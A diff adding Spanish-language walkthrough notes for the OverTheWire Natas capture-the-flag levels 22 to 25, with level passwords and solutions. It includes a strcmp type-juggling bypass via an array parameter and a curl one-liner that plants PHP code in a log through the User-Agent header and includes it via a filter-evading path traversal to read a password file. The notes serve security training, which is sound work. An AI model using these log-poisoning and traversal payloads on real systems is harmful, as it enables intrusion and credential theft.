@@ -426,4 +426,49 @@ The credentials for the next level are:<br><pre>Username: natas22
 Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</pre>
 ```
 
-#natas 22
+# natas22
+
+Sorprendentemente sencillo, basta con añadir ?revelio en el GET. Luego he visto que hay una complicación (una redirección) que se vence, por ejemplo, usando curl (que es lo que yo había usado por casualidad desde el principio)
+
+Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+
+# natas23
+
+Esta vuelve a ser casi trivial leyendo el source:
+
+http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou
+
+Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+# natas24
+
+Este es tremendo O_o. La única operación que hay en la fuente es un strcmp y lo que podemos controlar es la password que pasamos por GET/POST.
+
+Buscando en Google hay un documento sobre "type juggling" (https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf) que da la pista necesaria: hacer fallar el strcmp enviando... ¡un array! Este comportamiento está también documentado en https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet.
+
+En consecuencia:
+
+```
+http://natas24.natas.labs.overthewire.org/?passwd[]=foo
+
+ Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23
+
+The credentials for the next level are:
+
+Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+```
+
+# natas25
+
+Por una parte tenemos un fichero en el que se escribe el HTTP_USER_AGENT (y, por tanto, lo que queramos). Por otra una inclusión de fichero con una sanitización insuficiente del path. La gracia es juntar las dos cosas:
+
+* Inyectar código en el log que lea el fichero de passwords
+* Mostrar el log
+
+De un tirón y sin más explicación:
+`curl -q --cookie "PHPSESSID=ojoooooo" -H "User-agent: <?php echo file_get_contents('/etc/natas_webpass/natas26'); php?>" -u natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c "http://natas25.natas.labs.overthewire.org?lang=..././..././..././..././..././tmp/natas25_ojoooooo.log`
+
+Entr los errores tenemos la cadena buscada: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+# natas26
